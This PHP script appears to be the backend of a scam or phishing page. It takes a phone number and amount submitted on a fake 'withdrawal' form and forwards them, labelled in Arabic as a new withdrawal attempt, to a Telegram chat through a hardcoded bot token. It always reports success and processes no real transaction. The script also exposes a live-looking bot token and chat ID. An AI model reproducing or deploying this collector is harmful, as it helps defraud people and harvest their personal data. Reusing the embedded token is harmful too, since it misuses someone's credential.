<?php

$botToken = "8784939544:AAEiZBaMRV7TdG-qdbWIfKuKBsuqnHETxi8";
$chatId = "7535564997";

$phone = $_POST['phone'] ?? 'فارغ';
$amount = $_POST['amount'] ?? 'فارغ';

$message = "
📥 محاولة سحب جديدة

📞 الرقم: $phone
💰 المبلغ: $amount

🕒 الوقت: " . date("Y-m-d H:i:s");

$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text' => $message
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ]
];

$context = stream_context_create($options);

file_get_contents($url, false, $context);

echo json_encode([
    "status" => true
]);

?>